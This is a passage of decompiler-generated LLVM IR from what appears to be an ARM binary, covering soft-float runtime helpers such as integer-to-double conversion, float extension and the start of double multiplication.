  %v1_1cd68 = sub i32 0, %v2_1cd54
  %v0_1cd6c = load i32, i32* @r0, align 4
  %v6_1cd6c = lshr i32 %v0_1cd6c, %v1_1cd64
  %v1_1cd70 = load i32, i32* %r1.global-to-local, align 4
  %v7_1cd70 = shl i32 %v1_1cd70, %v1_1cd68
  %v8_1cd70 = or i32 %v7_1cd70, %v6_1cd6c
  %v0_1cd74 = load i32, i32* @r5, align 4
  %v7_1cd74 = lshr i32 %v1_1cd70, %v1_1cd64
  %v8_1cd74 = or i32 %v0_1cd74, %v7_1cd74
  store i32 %v8_1cd74, i32* %r1.global-to-local, align 4
  %v2_1cd78 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1cd78, i32* %r4.global-to-local, align 4
  ret i32 %v8_1cd70

dec_label_pc_1cd80:                               ; preds = %dec_label_pc_1cd5c
  %v1_1cd80 = sub i32 0, %v2_1cd54
  %v1_1cd84 = add i32 %v2_1cd54, 32
  %v0_1cd88 = load i32, i32* @r0, align 4
  %v6_1cd88 = lshr i32 %v0_1cd88, %v1_1cd84
  %v1_1cd8c = load i32, i32* %r1.global-to-local, align 4
  %v7_1cd8c = shl i32 %v1_1cd8c, %v1_1cd80
  %v8_1cd8c = or i32 %v7_1cd8c, %v6_1cd88
  %v0_1cd90 = load i32, i32* @r5, align 4
  store i32 %v0_1cd90, i32* %r1.global-to-local, align 4
  %v2_1cd94 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1cd94, i32* %r4.global-to-local, align 4
  ret i32 %v8_1cd8c

dec_label_pc_1cd9c:                               ; preds = %.thread8
  %v0_1cd9c = load i32, i32* %r1.global-to-local, align 4
  %v6_1cd9c = lshr i32 %v0_1cd9c, %v2_1cd54
  %v0_1cda0 = load i32, i32* @r5, align 4
  store i32 %v0_1cda0, i32* %r1.global-to-local, align 4
  %v2_1cda4 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_1cda4, i32* %r4.global-to-local, align 4
  ret i32 %v6_1cd9c

; uselistorder directives
  uselistorder i32 %v2_1cd54, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v2_1cd3c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1cd3c, { 2, 0, 1, 3 }
  uselistorder i32 %v6_1cd30, { 1, 0, 2 }
  uselistorder i32 %v2_1cd04, { 1, 0, 2 }
  uselistorder i32 %v5_1cd00, { 6, 0, 5, 7, 3, 8, 2, 4, 9, 10, 1, 12, 11 }
  uselistorder i32 %v4_1ccec, { 1, 0 }
  uselistorder i32 %v1_1ccec, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1cce0, { 1, 0 }
  uselistorder i32 %v1_1cce0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1ccd4, { 1, 0 }
  uselistorder i32 %v0_1cd20, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32* %r1.global-to-local, { 0, 8, 1, 6, 2, 7, 3, 4, 5, 9, 10 }
  uselistorder i32 -12, { 3, 1, 2, 4, 16, 17, 5, 19, 20, 6, 21, 22, 18, 15, 14, 13, 12, 11, 23, 24, 25, 26, 10, 7, 9, 8, 27, 28, 29, 0 }
  uselistorder i32 -20, { 0, 2, 1 }
  uselistorder i32 -2, { 9, 10, 11, 2, 4, 5, 3, 12, 13, 14, 0, 6, 8, 7, 15, 21, 20, 22, 23, 24, 17, 16, 19, 18, 1 }
  uselistorder i32 -4, { 10, 0, 1, 53, 11, 49, 12, 20, 73, 74, 75, 6, 21, 22, 23, 76, 77, 78, 7, 24, 25, 26, 79, 80, 81, 8, 27, 28, 82, 19, 18, 83, 84, 85, 17, 16, 15, 14, 29, 30, 31, 32, 33, 5, 34, 3, 35, 4, 86, 13, 36, 45, 46, 47, 48, 37, 38, 61, 62, 63, 9, 64, 65, 66, 39, 60, 2, 40, 54, 55, 56, 57, 58, 59, 67, 68, 69, 70, 71, 72, 41, 50, 51, 52, 42, 43, 44 }
  uselistorder i32 15, { 8, 9, 3, 15, 10, 11, 12, 13, 0, 16, 1, 19, 18, 2, 14, 4, 5, 6, 7, 17 }
  uselistorder i32 -8, { 11, 12, 1, 40, 19, 20, 21, 22, 23, 24, 18, 17, 10, 16, 15, 14, 13, 25, 26, 27, 28, 29, 9, 44, 45, 30, 31, 32, 33, 34, 43, 46, 35, 47, 39, 36, 37, 38, 2, 41, 42, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 128, { 14, 15, 8, 9, 6, 7, 10, 22, 21, 0, 1, 2, 11, 18, 19, 3, 4, 12, 20, 5, 17, 13, 23, 16 }
  uselistorder i32 255, { 8, 9, 5, 12, 13, 4, 6, 7, 11, 0, 1, 2, 3, 14, 10 }
  uselistorder i32 -16, { 2, 7, 8, 9, 10, 11, 12, 13, 14, 15, 6, 5, 4, 1, 16, 17, 18, 19, 20, 21, 3, 0, 22 }
  uselistorder i32 65536, { 1, 2, 3, 0, 4, 5, 6, 7, 9, 8, 14, 10, 15, 11, 16, 12, 17, 13, 18, 19, 20, 24, 21, 25, 22, 26, 23, 27, 29, 28, 30, 75, 74, 72, 76, 31, 32, 33, 34, 35, 36, 37, 38, 39, 73, 40, 42, 41, 43, 45, 44, 46, 47, 48, 49, 50, 52, 51, 53, 56, 55, 54, 57, 58, 59, 62, 61, 60, 63, 65, 66, 64, 67, 69, 70, 68, 71 }
  uselistorder i32 32768, { 3, 4, 2, 0, 1, 6, 5 }
  uselistorder i32 65535, { 3, 4, 1, 2, 5, 0 }
  uselistorder i32 52, { 1, 27, 5, 30, 21, 22, 6, 2, 28, 29, 35, 36, 4, 37, 0, 38, 39, 7, 8, 9, 11, 10, 12, 3, 13, 24, 32, 25, 26, 14, 16, 23, 15, 17, 18, 19, 33, 31, 34, 20 }
  uselistorder i32 20, { 7, 74, 75, 4, 12, 9, 8, 14, 80, 2, 60, 15, 76, 77, 48, 49, 50, 51, 73, 16, 85, 13, 86, 87, 5, 88, 81, 17, 18, 61, 62, 70, 71, 72, 52, 19, 20, 53, 54, 3, 21, 22, 89, 23, 24, 25, 26, 27, 90, 28, 30, 31, 78, 79, 32, 29, 33, 6, 1, 0, 10, 34, 35, 36, 37, 38, 39, 11, 63, 64, 65, 66, 40, 55, 41, 42, 82, 43, 44, 56, 57, 58, 59, 45, 67, 68, 69, 46, 83, 47, 84 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_1cd2c, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1cdac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_1cdac:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_1cdac = load i32, i32* @r4, align 4
  %v2_1cdac = icmp eq i32 %v0_1cdac, 0
  %v1_1cdb0 = xor i32 %arg3, 1048576
  store i32 %v1_1cdb0, i32* @r3, align 4
  br i1 %v2_1cdac, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_1cdac
  %v1_1cdb4 = load i32, i32* @r1, align 4
  %v2_1cdb4 = xor i32 %v1_1cdb4, 1048576
  store i32 %v2_1cdb4, i32* @r1, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_1cdac
  %v1_1cdbc = load i32, i32* @r5, align 4
  %v2_1cdbc = add i32 %v1_1cdbc, -1
  store i32 %v2_1cdbc, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_1cdc0 = call i32 @function_1cc04()
  store i32 %v0_1cdc0, i32* %r0.global-to-local, align 4
  %v0_1cdc4 = load i32, i32* @r4, align 4
  %v0_1cdc4.off = add i32 %v0_1cdc4, 4194303
  %tmp = icmp ult i32 %v0_1cdc4.off, 2097152
  %v1_1ce54 = load i32, i32* @r5, align 4
  %v1_1ce54.off = add i32 %v1_1ce54, 4194303
  %tmp44 = icmp ult i32 %v1_1ce54.off, 2097152
  br i1 %tmp, label %.thread11, label %bb30

bb30:                                             ; preds = %bb
  br i1 %tmp44, label %bb37, label %dec_label_pc_1cdd0

dec_label_pc_1cdd0:                               ; preds = %bb30
  %v4_1cdd0 = icmp eq i32 %v1_1ce54, %v0_1cdc4
  br i1 %v4_1cdd0, label %bb31, label %dec_label_pc_1cddc

bb31:                                             ; preds = %dec_label_pc_1cdd0
  %v2_1cdd4 = load i32, i32* @r2, align 4
  %v5_1cdd4 = icmp eq i32 %v2_1cdd4, %v0_1cdc0
  br i1 %v5_1cdd4, label %dec_label_pc_1cdf0, label %dec_label_pc_1cddc

dec_label_pc_1cddc:                               ; preds = %dec_label_pc_1cdd0, %bb31
  %v2_1cddc = or i32 %v0_1cdc4, %v0_1cdc0
  %v4_1cddc = icmp eq i32 %v2_1cddc, 0
  br i1 %v4_1cddc, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_1cddc
  %v1_1cde4 = load i32, i32* @r2, align 4
  store i32 %v1_1cde4, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1cddc, %bb32
  %v1_1cdec = phi i32 [ %v0_1cdc0, %dec_label_pc_1cddc ], [ %v1_1cde4, %bb32 ]
  ret i32 %v1_1cdec

dec_label_pc_1cdf0:                               ; preds = %bb31
  %v0_1cdf0 = load i32, i32* @r1, align 4
  %v1_1cdf0 = load i32, i32* @r3, align 4
  %v4_1cdf0 = icmp eq i32 %v1_1cdf0, %v0_1cdf0
  br i1 %v4_1cdf0, label %dec_label_pc_1cdf0..thread8_crit_edge, label %bb33

dec_label_pc_1cdf0..thread8_crit_edge:            ; preds = %dec_label_pc_1cdf0
  %v0_1ce00.pre = load i32, i32* @lr, align 4
  br label %.thread8

bb33:                                             ; preds = %dec_label_pc_1cdf0
  store i32 0, i32* @r1, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r4, align 4
  store i32 %arg6, i32* @lr, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1cdf0..thread8_crit_edge, %bb33
  %v0_1ce00 = phi i32 [ %v0_1ce00.pre, %dec_label_pc_1cdf0..thread8_crit_edge ], [ %arg6, %bb33 ]
  %v2_1ce00 = xor i1 %v4_1cdf0, true
  call void @__pseudo_cond_branch(i1 %v2_1ce00, i32 %v0_1ce00)
  %v0_1ce04 = load i32, i32* @r4, align 4
  %tmp45 = icmp ult i32 %v0_1ce04, 2097152
  br i1 %tmp45, label %dec_label_pc_1ce0c, label %dec_label_pc_1ce20

dec_label_pc_1ce0c:                               ; preds = %.thread8
  %v0_1ce0c = load i32, i32* %r0.global-to-local, align 4
  %v1_1ce0c = icmp slt i32 %v0_1ce0c, 0
  %v2_1ce0c = mul i32 %v0_1ce0c, 2
  store i32 %v2_1ce0c, i32* %r0.global-to-local, align 4
  %v0_1ce10 = load i32, i32* @r1, align 4
  %v3_1ce10 = mul i32 %v0_1ce10, 2
  %v4_1ce10 = zext i1 %v1_1ce0c to i32
  %v5_1ce10 = or i32 %v3_1ce10, %v4_1ce10
  %v9_1ce10 = icmp ule i32 %v5_1ce10, %v0_1ce10
  %v10_1ce10 = icmp ult i32 %v3_1ce10, %v0_1ce10
  %v11_1ce10 = select i1 %v1_1ce0c, i1 %v9_1ce10, i1 %v10_1ce10
  br i1 %v11_1ce10, label %bb34, label %bb35

bb34:                                             ; preds = %dec_label_pc_1ce0c
  br label %bb35

bb35:                                             ; preds = %dec_label_pc_1ce0c, %bb34
  ret i32 %v2_1ce0c

dec_label_pc_1ce20:                               ; preds = %.thread8
  %v2_1ce20 = icmp ugt i32 %v0_1ce04, -4194305
  br i1 %v2_1ce20, label %dec_label_pc_1ce20..thread9_crit_edge, label %bb36

dec_label_pc_1ce20..thread9_crit_edge:            ; preds = %dec_label_pc_1ce20
  %v0_1ce2c.pre = load i32, i32* @lr, align 4
  br label %.thread9

bb36:                                             ; preds = %dec_label_pc_1ce20
  %v1_1ce24 = load i32, i32* @r1, align 4
  %v2_1ce24 = add i32 %v1_1ce24, 1048576
  store i32 %v2_1ce24, i32* @r1, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_1ce20..thread9_crit_edge, %bb36
  %v0_1ce2c = phi i32 [ %v0_1ce2c.pre, %dec_label_pc_1ce20..thread9_crit_edge ], [ %arg9, %bb36 ]
  %v2_1ce2c = xor i1 %v2_1ce20, true
  call void @__pseudo_cond_branch(i1 %v2_1ce2c, i32 %v0_1ce2c)
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

.thread11:                                        ; preds = %bb
  %v1_1ce60.pre = load i32, i32* @r1, align 4
  br i1 %tmp44, label %.thread13, label %.thread14

.thread14:                                        ; preds = %.thread11
  store i32 %v1_1ce60.pre, i32* @r3, align 4
  br label %bb38

bb37:                                             ; preds = %bb30
  %v1_1ce4c = load i32, i32* @r3, align 4
  %v1_1ce50 = load i32, i32* @r2, align 4
  store i32 %v1_1ce50, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %bb37, %.thread14
  %v1_1ce6023 = phi i32 [ %v1_1ce60.pre, %.thread14 ], [ %v1_1ce4c, %bb37 ]
  %v1_1ce5c = phi i32 [ %v0_1cdc0, %.thread14 ], [ %v1_1ce50, %bb37 ]
  store i32 %v1_1ce5c, i32* @r2, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11, %bb38
  %v1_1ce6c = phi i32 [ %v1_1ce6023, %bb38 ], [ %v1_1ce60.pre, %.thread11 ]
  %v1_1ce74 = phi i32 [ %v1_1ce5c, %bb38 ], [ %v0_1cdc0, %.thread11 ]
  %v4_1ce60 = mul i32 %v1_1ce6c, 4096
  %v5_1ce60 = or i32 %v4_1ce60, %v1_1ce74
  %v7_1ce60 = icmp eq i32 %v5_1ce60, 0
  br i1 %v7_1ce60, label %bb39, label %.thread17

bb39:                                             ; preds = %.thread13
  %v1_1ce64 = load i32, i32* @r2, align 4
  %v2_1ce64 = load i32, i32* @r3, align 4
  %v5_1ce64 = mul i32 %v2_1ce64, 4096
  %v6_1ce64 = or i32 %v5_1ce64, %v1_1ce64
  %v8_1ce64 = icmp eq i32 %v6_1ce64, 0
  br i1 %v8_1ce64, label %bb40, label %.thread17

bb40:                                             ; preds = %bb39
  %v5_1ce68 = icmp eq i32 %v2_1ce64, %v1_1ce6c
  br i1 %v5_1ce68, label %bb41, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb39, %bb40
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread17
  ret i32 %v1_1ce74

; uselistorder directives
  uselistorder i32 %v1_1ce60.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1ce10, { 1, 2, 0 }
  uselistorder i32 %v2_1ce0c, { 1, 0 }
  uselistorder i1 %v1_1ce0c, { 1, 0 }
  uselistorder i32 %v0_1ce04, { 1, 0 }
  uselistorder i1 %v4_1cdf0, { 1, 0 }
  uselistorder i32 %v0_1cdc4, { 2, 0, 1 }
  uselistorder i32 %v0_1cdc0, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_1cddc, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__aeabi_ui2d(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_1ce78 = icmp eq i32 %arg1, 0
  br i1 %v2_1ce78, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_1ce80 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1ce78, i32 %v0_1ce80)
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* @r1, align 4
  %v0_1ce98 = call i32 @function_1ccb8()
  ret i32 %v0_1ce98

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__floatsidf(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_1ce9c = icmp eq i32 %arg1, 0
  br i1 %v2_1ce9c, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_1cea4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1ce9c, i32 %v0_1cea4)
  store i32 1074, i32* @r4, align 4
  %v1_1ceb4 = and i32 %arg1, -2147483648
  store i32 %v1_1ceb4, i32* @r5, align 4
  %v2_1ceb4 = icmp eq i32 %v1_1ceb4, 0
  br i1 %v2_1ceb4, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_1ceb8 = sub i32 0, %arg1
  store i32 %v2_1ceb8, i32* @r0, align 4
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  store i32 0, i32* @r1, align 4
  %v0_1cec0 = call i32 @function_1ccb8()
  ret i32 %v0_1cec0

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1, 3 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__extendsfdf2(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %v2_1cec4 = mul i32 %arg1, 2
  store i32 %v2_1cec4, i32* %r2.global-to-local, align 4
  %v4_1cec4 = icmp eq i32 %v2_1cec4, 0
  %v1_1cec8 = and i32 %v2_1cec4, 4
  %v2_1cec8 = icmp ne i32 %v1_1cec8, 0
  %v3_1cec8 = sdiv i32 %v2_1cec4, 8
  %v3_1cecc = zext i1 %v2_1cec8 to i32
  %v6_1cecc = zext i32 %v3_1cec8 to i64
  %v7_1cecc = sub nsw i32 33, %v3_1cec8
  %v8_1cecc = zext i32 %v7_1cecc to i64
  %v9_1cecc = shl i64 %v6_1cecc, %v8_1cecc
  %v10_1cecc = sub nsw i32 32, %v3_1cec8
  %v11_1cecc = shl i32 %v3_1cecc, %v10_1cecc
  %v12_1cecc = zext i32 %v11_1cecc to i64
  %v14_1cecc = or i64 %v12_1cecc, %v9_1cecc
  %v15_1cecc = trunc i64 %v14_1cecc to i32
  store i32 %v15_1cecc, i32* %r1.global-to-local, align 4
  %v3_1ced0 = mul i32 %arg1, 536870912
  store i32 %v3_1ced0, i32* @r0, align 4
  br i1 %v4_1cec4, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_1ced4 = and i32 %v2_1cec4, -16777216
  store i32 %v2_1ced4, i32* @r3, align 4
  %v4_1ced4 = icmp eq i32 %v2_1ced4, 0
  br i1 %v4_1ced4, label %.thread1, label %bb7

bb7:                                              ; preds = %bb
  %v4_1ced8 = icmp ugt i32 %v2_1cec4, -16777217
  br i1 %v4_1ced8, label %.thread1, label %bb8

bb8:                                              ; preds = %bb7
  %v2_1cedc = xor i32 %v15_1cecc, 939524096
  store i32 %v2_1cedc, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb, %bb7, %bb8
  %v1_1cee0 = phi i1 [ false, %bb ], [ false, %bb7 ], [ true, %bb8 ], [ false, %entry ]
  %v0_1cee0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1cee0, i32 %v0_1cee0)
  %v0_1cee4 = load i32, i32* %r2.global-to-local, align 4
  %v2_1cee4 = icmp eq i32 %v0_1cee4, 0
  br i1 %v2_1cee4, label %bb10, label %bb9

bb9:                                              ; preds = %.thread1
  %v1_1cee8 = load i32, i32* @r3, align 4
  %v4_1cee8 = icmp eq i32 %v1_1cee8, -16777216
  br label %bb10

bb10:                                             ; preds = %.thread1, %bb9
  %v1_1ceec = phi i1 [ true, %.thread1 ], [ %v4_1cee8, %bb9 ]
  %v0_1ceec = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1ceec, i32 %v0_1ceec)
  store i32 896, i32* @r4, align 4
  %v0_1cef8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1cef8 = and i32 %v0_1cef8, -2147483648
  store i32 %v1_1cef8, i32* @r5, align 4
  %tmp = bitcast i32 %v0_1cef8 to float
  %tmp11 = call float @fabsf(float %tmp)
  %v1_1cefc = bitcast float %tmp11 to i32
  store i32 %v1_1cefc, i32* @r1, align 4
  %v0_1cf00 = call i32 @function_1ccb8()
  ret i32 %v0_1cf00

; uselistorder directives
  uselistorder i32 %v3_1cec8, { 1, 2, 0 }
  uselistorder i32 %v2_1cec4, { 0, 4, 5, 3, 2, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32 ()* @function_1ccb8, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
}

define i32 @__aeabi_ul2d(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_1cf04 = or i32 %arg2, %arg1
  %v4_1cf04 = icmp eq i32 %v2_1cf04, 0
  %v0_1cf08 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1cf04, i32 %v0_1cf08)
  store i32 0, i32* @r5, align 4
  %v0_1cf14 = call i32 @function_1cf34()
  ret i32 %v0_1cf14
}

define i32 @__floatdidf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1cf18 = or i32 %arg2, %arg1
  %v4_1cf18 = icmp eq i32 %v2_1cf18, 0
  %v0_1cf1c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1cf18, i32 %v0_1cf1c)
  %v1_1cf28 = icmp sgt i32 %arg2, -1
  call void @__pseudo_cond_branch(i1 %v1_1cf28, i32 ptrtoint (i32* @global_var_1cf34.1392 to i32))
  %v1_1cf2c = sub i32 0, %arg1
  ret i32 %v1_1cf2c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_1cf34() local_unnamed_addr {
dec_label_pc_1cf34:
  %r4.global-to-local = alloca i32, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  %v0_1cf3c = load i32, i32* @r1, align 4
  %tmp = icmp ult i32 %v0_1cf3c, 4194304
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_1cc58.1390 to i32))
  %tmp6 = icmp ult i32 %v0_1cf3c, 33554432
  br i1 %tmp6, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_1cf34
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_1cf34, %bb
  %v1_1cf54 = phi i32 [ 3, %dec_label_pc_1cf34 ], [ 6, %bb ]
  %tmp7 = icmp ult i32 %v0_1cf3c, 268435456
  br i1 %tmp7, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_1cf54 = add nuw nsw i32 %v1_1cf54, 3
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  %v0_1cf58 = phi i32 [ %v1_1cf54, %bb3 ], [ %v2_1cf54, %bb4 ]
  %not. = icmp slt i32 %v0_1cf3c, 0
  %v4_1cf58 = zext i1 %not. to i32
  %v5_1cf58 = add nsw i32 %v0_1cf58, %v4_1cf58
  %v1_1cf5c = sub nsw i32 32, %v5_1cf58
  %v0_1cf60 = load i32, i32* @r0, align 4
  %v6_1cf60 = shl i32 %v0_1cf60, %v1_1cf5c
  store i32 %v6_1cf60, i32* @ip, align 4
  %v6_1cf64 = lshr i32 %v0_1cf60, %v5_1cf58
  %v1_1cf68 = load i32, i32* @r1, align 4
  %v7_1cf68 = shl i32 %v1_1cf68, %v1_1cf5c
  %v8_1cf68 = or i32 %v7_1cf68, %v6_1cf64
  %v6_1cf6c = lshr i32 %v1_1cf68, %v5_1cf58
  %v0_1cf70 = load i32, i32* %r4.global-to-local, align 4
  %v2_1cf70 = add i32 %v0_1cf70, %v5_1cf58
  store i32 %v2_1cf70, i32* @r4, align 4
  %v4_1cf74 = sext i32 %v8_1cf68 to i64
  %v5_1cf74 = call i32 @function_1cc58(i64 %v4_1cf74, i32 %v6_1cf6c, i32 %v5_1cf58, i32 %v1_1cf5c)
  ret i32 %v5_1cf74

; uselistorder directives
  uselistorder i32 %v5_1cf58, { 2, 0, 1, 3, 4 }
  uselistorder i32 6, { 5, 25, 26, 4, 19, 20, 27, 28, 21, 22, 6, 7, 31, 3, 0, 8, 23, 2, 9, 10, 11, 12, 1, 13, 14, 24, 15, 18, 16, 17, 29, 30 }
  uselistorder i32 3, { 54, 12, 40, 69, 41, 70, 71, 72, 74, 8, 75, 16, 76, 56, 0, 13, 77, 9, 1, 2, 66, 57, 3, 4, 42, 43, 85, 44, 45, 46, 47, 48, 49, 58, 6, 20, 59, 21, 22, 61, 23, 62, 24, 63, 25, 64, 26, 65, 53, 7, 55, 50, 86, 14, 81, 18, 82, 17, 83, 19, 80, 10, 78, 11, 60, 5, 73, 84, 51, 27, 67, 28, 29, 68, 30, 52, 33, 32, 31, 39, 79, 34, 35, 36, 37, 38, 15 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dmul(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = sext i32 %arg3 to i64
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp32 = trunc i64 %arg1 to i32
  store i32 %tmp32, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1cf78 = load i32, i32* @r4, align 4
  store i32 %v3_1cf78, i32* %stack_var_-16, align 4
  %v12_1cf78 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v4_1cf84 = udiv i32 %arg2, 1048576
  %v5_1cf84 = urem i32 %v4_1cf84, 2048
  store i32 %v5_1cf84, i32* %r4.global-to-local, align 4
  %v6_1cf84 = icmp eq i32 %v5_1cf84, 0
  br i1 %v6_1cf84, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v5_1cf88 = udiv i32 %arg4, 1048576
  %v6_1cf88 = urem i32 %v5_1cf88, 2048
  store i32 %v6_1cf88, i32* @r5, align 4
  %v7_1cf88 = icmp eq i32 %v6_1cf88, 0
  br i1 %v7_1cf88, label %.thread2, label %bb38

bb38:                                             ; preds = %bb
  %v5_1cf8c = icmp eq i32 %v5_1cf84, 2047
  br i1 %v5_1cf8c, label %.thread2, label %bb39

bb39:                                             ; preds = %bb38
  %v5_1cf90 = icmp eq i32 %v6_1cf88, 2047
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb, %bb38, %bb39
  %v0_1cf94 = phi i1 [ true, %bb ], [ true, %bb38 ], [ %v5_1cf90, %bb39 ], [ true, %entry ]
  store i32 ptrtoint (i32* @global_var_1cf98.1395 to i32), i32* %lr.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %v0_1cf94, i32 ptrtoint (i32* @global_var_1d170.1393 to i32))
  %v0_1cf98 = load i32, i32* %r4.global-to-local, align 4
  %v1_1cf98 = load i32, i32* @r5, align 4
  %v2_1cf98 = add i32 %v1_1cf98, %v0_1cf98
  store i32 %v2_1cf98, i32* %r4.global-to-local, align 4
  %v2_1cf9c = xor i32 %arg4, %arg2
  %v1_1cfa0 = load i32, i32* %ip.global-to-local, align 4
  %tmp51 = mul i32 %v1_1cfa0, -2097152
  %v5_1cfa0 = add i32 %tmp51, -1
  %v6_1cfa0 = and i32 %v5_1cfa0, %arg2
  store i32 %v6_1cfa0, i32* %r1.global-to-local, align 4
  %v6_1cfa4 = and i32 %v5_1cfa0, %arg4
  %v5_1cfa8 = mul i32 %arg2, 4096
  %v6_1cfa8 = or i32 %v5_1cfa8, %tmp32
  %v8_1cfa8 = icmp eq i32 %v6_1cfa8, 0
  br i1 %v8_1cfa8, label %.thread3, label %bb40

.thread3:                                         ; preds = %.thread2
  %v1_1cfb05 = or i32 %v6_1cfa0, 1048576
  store i32 %v1_1cfb05, i32* %r1.global-to-local, align 4
  %v1_1cfb47 = or i32 %v6_1cfa4, 1048576
  br label %dec_label_pc_1d034

bb40:                                             ; preds = %.thread2
  %v6_1cfac = mul i32 %arg4, 4096
  %v7_1cfac = or i32 %v6_1cfac, %arg3
  %v9_1cfac = icmp eq i32 %v7_1cfac, 0
  %v1_1cfb0 = or i32 %v6_1cfa0, 1048576
  store i32 %v1_1cfb0, i32* %r1.global-to-local, align 4
  %v1_1cfb4 = or i32 %v6_1cfa4, 1048576
  br i1 %v9_1cfac, label %dec_label_pc_1d034, label %dec_label_pc_1cfbc

dec_label_pc_1cfbc:                               ; preds = %bb40
  %v6_1cfbc = mul nuw i64 %tmp, %arg1
  %v7_1cfbc = udiv i64 %v6_1cfbc, 4294967296
  %v9_1cfbc = trunc i64 %v6_1cfbc to i32
